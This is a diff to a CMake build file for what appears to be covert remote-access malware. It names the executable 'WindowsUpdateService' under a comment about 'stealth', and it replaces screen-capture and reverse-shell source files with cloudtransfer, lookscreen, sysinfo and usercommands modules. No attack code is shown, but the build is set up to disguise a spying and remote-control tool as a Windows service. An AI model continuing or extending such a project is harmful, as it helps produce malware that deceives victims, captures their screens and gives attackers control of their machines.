@@ -7,6 +7,7 @@ set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/${CMAKE_BUILD_TYPE})
 # The desired final executable name for stealth
 set(STEALTH_EXE_NAME "WindowsUpdateService")
 set(CMAKE_CXX_STANDARD 17)
+enable_language(RC)
 
 if(WIN32)
 
@@ -51,8 +52,10 @@ if(WIN32)
 else()
     add_executable(${PROJECT_NAME} 
         src/main.c
-        src/screencapture.c
-        src/reverseshell.c
+        src/cloudtransfer.c
+        src/lookscreen.c
+        src/sysinfo.c 
+        src/usercommands.c
     )
 endif()
 
